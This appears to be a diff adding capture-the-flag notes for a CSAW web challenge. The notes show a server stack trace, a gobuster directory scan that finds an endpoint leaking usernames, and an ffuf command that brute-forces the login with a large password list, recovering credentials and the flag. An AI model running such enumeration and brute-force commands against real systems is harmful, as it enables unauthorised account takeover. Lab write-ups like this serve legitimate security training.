@@ -1,0 +1,44 @@
+http://web.chal.csaw.io:5006/admins/login
+
+```
+TypeError: req.flash is not a function
+    at allFailed (/usr/src/app/node_modules/passport/lib/middleware/authenticate.js:125:15)
+    at attempt (/usr/src/app/node_modules/passport/lib/middleware/authenticate.js:174:28)
+    at Strategy.strategy.fail (/usr/src/app/node_modules/passport/lib/middleware/authenticate.js:296:9)
+    at Strategy.authenticate (/usr/src/app/node_modules/passport-local/lib/strategy.js:75:17)
+    at attempt (/usr/src/app/node_modules/passport/lib/middleware/authenticate.js:360:16)
+    at authenticate (/usr/src/app/node_modules/passport/lib/middleware/authenticate.js:361:7)
+    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
+    at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
+```
+
+./gobuster dir -u http://web.chal.csaw.io:5006/admins -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -o gobuster-root
+```
+/contact              (Status: 200) [Size: 1789]
+/login                (Status: 200) [Size: 2078]
+/all                  (Status: 200) [Size: 104]
+/Contact              (Status: 200) [Size: 1789]
+/Login                (Status: 200) [Size: 2078]
+/logout               (Status: 302) [Size: 29] [--> ./login]
+/All                  (Status: 200) [Size: 104]
+/Logout               (Status: 302) [Size: 29] [--> ./login]
+/ALL                  (Status: 200) [Size: 104]
+/CONTACT              (Status: 200) [Size: 1789]
+/LogIn                (Status: 200) [Size: 2078]
+/LOGIN                (Status: 200) [Size: 2078]
+```
+
+/all
+```
+[{"rowid":1,"username":"yrock","name":"Yue Rock"},{"rowid":2,"username":"iripp","name":"Ionakana Ripp"}]
+```
+
+./ffuf -c -w username.txt:USERNAME -w /usr/local/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt:PASSWORD -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=USERNAME&password=PASSWORD" -u http://web.chal.csaw.io:5006/admins/login -t 64 -fs 35 -o output
+```
+* USERNAME: iripp
+* PASSWORD: doughnut
+```
+
+flag{United_w3_leek_the_d4tabas3}
